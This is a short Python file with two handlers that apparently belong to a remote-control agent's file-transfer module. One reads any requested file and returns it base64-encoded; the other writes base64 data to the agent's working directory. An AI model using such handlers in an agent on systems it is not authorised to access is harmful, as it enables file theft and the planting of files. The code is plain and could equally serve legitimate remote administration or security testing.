import base64
import os

def handle_download(agent ,task):
    file_path = task.get("path")
                
    if not file_path or not os.path.exists(file_path):
        raise ValueError("File not found")
    with open(file_path, "rb") as f:
        file_data = f.read()
                    
        encoded = base64.b64encode(file_data).decode()
                
        return {"status": "success",
                "output": {f"[*] filename": os.path.basename(file_path), 
                "data": encoded}}

def handle_upload(agent, task):
    filename = task.get("filename")
    file_data = task.get("data")
                
    if not filename or not file_data:
        raise ValueError("Missing filename or data")
                
    decoded = base64.b64decode(file_data)
    save_path = os.path.join(agent.cwd, filename)
                
    with open(save_path, "wb") as f:
        f.write(decoded)
                    
        return{"status": "success",
               "output": f"[*] File Uploaded to: {save_path}"}